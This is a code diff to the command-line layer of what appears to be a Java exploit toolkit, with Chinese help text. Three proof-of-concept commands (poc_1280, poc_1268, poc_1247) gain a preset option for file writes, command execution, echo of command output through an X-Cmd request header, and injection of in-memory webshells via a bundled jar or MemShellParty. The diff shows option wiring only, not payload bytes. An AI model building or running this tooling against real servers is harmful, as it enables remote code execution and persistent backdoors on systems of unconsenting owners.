@@ -397,12 +397,19 @@ def poc_1280_cmd(
         "--currency-field",
         help="Currency MiscCodec 字段：currency 或 currencyCode",
     ),
-    echo: bool = typer.Option(False, "--echo", "-e", help="命令回显"),
-    engine: str = typer.Option("auto", "--engine", help="回显引擎"),
-    cmd: str = typer.Option("id", "--cmd", help="回显默认命令"),
+    preset: str = typer.Option(
+        "file",
+        "--preset",
+        help="postgresql/jython/groovy：file / custom / exec / echo / memshell",
+    ),
+    echo: bool = typer.Option(
+        False, "--echo", "-e", help="兼容：等价于 --preset echo"
+    ),
+    engine: str = typer.Option("auto", "--engine", help="回显引擎（preset=echo）"),
+    cmd: str = typer.Option("id", "--cmd", help="回显 / preset=exec 命令"),
     cmd_header: str = typer.Option("X-Cmd", "--cmd-header", help="命令请求头"),
     memshell: bool = typer.Option(
-        False, "--memshell", help="注入内存马（与 --echo 互斥；默认内置 jar）"
+        False, "--memshell", help="兼容：等价于 --preset memshell"
     ),
     ms_api: str = typer.Option(
         "jar", "--ms-api", help="jar 或 http(s)://... MemShellParty"
@@ -461,6 +468,7 @@ def poc_1280_cmd(
         classpath=classpath,
         wrap_currency=wrap_currency,
         currency_field=currency_field,
+        preset=preset,  # type: ignore[arg-type]
         echo=echo,
         engine=engine,  # type: ignore[arg-type]
         cmd=cmd,
@@ -530,12 +538,19 @@ def poc_1268_cmd(
         "--currency-field",
         help="Currency MiscCodec 字段：currency 或 currencyCode",
     ),
-    echo: bool = typer.Option(False, "--echo", "-e", help="postgresql_ssrf 命令回显"),
-    engine: str = typer.Option("auto", "--engine", help="回显引擎"),
-    cmd: str = typer.Option("id", "--cmd", help="回显默认命令"),
+    preset: str = typer.Option(
+        "file",
+        "--preset",
+        help="postgresql_ssrf：file / custom / exec / echo / memshell",
+    ),
+    echo: bool = typer.Option(
+        False, "--echo", "-e", help="兼容：等价于 --preset echo"
+    ),
+    engine: str = typer.Option("auto", "--engine", help="回显引擎（preset=echo）"),
+    cmd: str = typer.Option("id", "--cmd", help="回显 / preset=exec 命令"),
     cmd_header: str = typer.Option("X-Cmd", "--cmd-header", help="命令请求头"),
     memshell: bool = typer.Option(
-        False, "--memshell", help="注入内存马（与 --echo 互斥；默认内置 jar）"
+        False, "--memshell", help="兼容：等价于 --preset memshell"
     ),
     ms_api: str = typer.Option(
         "jar", "--ms-api", help="jar 或 http(s)://... MemShellParty"
@@ -596,6 +611,7 @@ def poc_1268_cmd(
         socket_factory_arg=socket_factory_arg,
         wrap_currency=wrap_currency,
         currency_field=currency_field,
+        preset=preset,  # type: ignore[arg-type]
         echo=echo,
         engine=engine,  # type: ignore[arg-type]
         cmd=cmd,
@@ -679,12 +695,25 @@ def poc_1247_cmd(
         "--json-key-array",
         help="json_key 用 JSONArray 作 key：[{...}]:{}",
     ),
-    echo: bool = typer.Option(False, "--echo", "-e", help="BCEL/H2/MyBatis 命令回显"),
-    engine: str = typer.Option("auto", "--engine", help="回显引擎"),
-    cmd: str = typer.Option("id", "--cmd", help="回显默认命令"),
+    preset: str = typer.Option(
+        "auto",
+        "--preset",
+        help="预设字节码：auto / custom / touch / exec / echo / memshell（off→custom）",
+    ),
+    proof_path: Optional[str] = typer.Option(
+        None, "--proof-path", help="preset=touch/exec/auto 证明文件路径"
+    ),
+    proof_content: Optional[str] = typer.Option(
+        None, "--proof-content", help="preset=touch/exec/auto 写入内容前缀"
+    ),
+    echo: bool = typer.Option(
+        False, "--echo", "-e", help="兼容：等价于 --preset echo"
+    ),
+    engine: str = typer.Option("auto", "--engine", help="回显引擎（preset=echo）"),
+    cmd: str = typer.Option("id", "--cmd", help="回显 / preset=exec 命令"),
     cmd_header: str = typer.Option("X-Cmd", "--cmd-header", help="命令请求头"),
     memshell: bool = typer.Option(
-        False, "--memshell", help="注入内存马（与 --echo 互斥；默认内置 jar）"
+        False, "--memshell", help="兼容：等价于 --preset memshell"
     ),
     ms_api: str = typer.Option(
         "jar", "--ms-api", help="jar 或 http(s)://... MemShellParty"
@@ -740,6 +769,9 @@ def poc_1247_cmd(
         currency_field=currency_field,
         json_key_with_type=not json_key_no_type,
         json_key_as_array=json_key_as_array,
+        preset=preset,  # type: ignore[arg-type]
+        proof_path=proof_path,
+        proof_content=proof_content,
         echo=echo,
         engine=engine,  # type: ignore[arg-type]
         cmd=cmd,
